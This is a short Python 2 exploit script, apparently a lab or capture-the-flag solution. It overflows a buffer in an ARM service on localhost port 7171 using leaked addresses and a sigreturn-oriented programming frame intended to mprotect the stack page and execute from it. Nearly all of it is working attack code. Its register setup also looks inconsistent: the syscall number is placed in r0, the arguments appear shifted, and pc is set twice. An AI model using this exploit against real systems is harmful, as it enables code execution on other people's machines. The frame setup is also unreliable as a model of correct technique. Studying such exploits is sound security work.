from struct import pack, unpack
from socket import create_connection
from Frame import SigreturnFrame
import string

PAGE_SIZE = 4096

SIGRETURN = 0x00008cb8
SVC = 0x8cc0

SYS_MPROTECT  = 125

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data


s = create_connection(("localhost", 7171))
buffer_address = recv_n_bytes(s, 4)
buffer_address = unpack("<I", buffer_address)[0]
buffer_page    = buffer_address & ~(PAGE_SIZE - 1)
print "[+] Buffer address is", hex(buffer_address)

page = recv_n_bytes(s, 4)
page = unpack("<I", page)[0]
print "[+] mmap'd page address is", hex(page)

sploit  = ""
sploit += "A" * (0x30-28) + "B" * 4
sploit += pack("<I", SIGRETURN)

frame = SigreturnFrame(arch="arm")
frame.set_regvalue("r0", 125)
frame.set_regvalue("r1", buffer_page)
frame.set_regvalue("r2", 0x1000)
frame.set_regvalue("sp", buffer_page)
frame.set_regvalue("pc", buffer_page)
frame.set_regvalue("pc", buffer_page)
frame.set_regvalue("cpsr", 0x60000010)


sploit += frame.get_frame()

print len(sploit)
s.send(sploit)
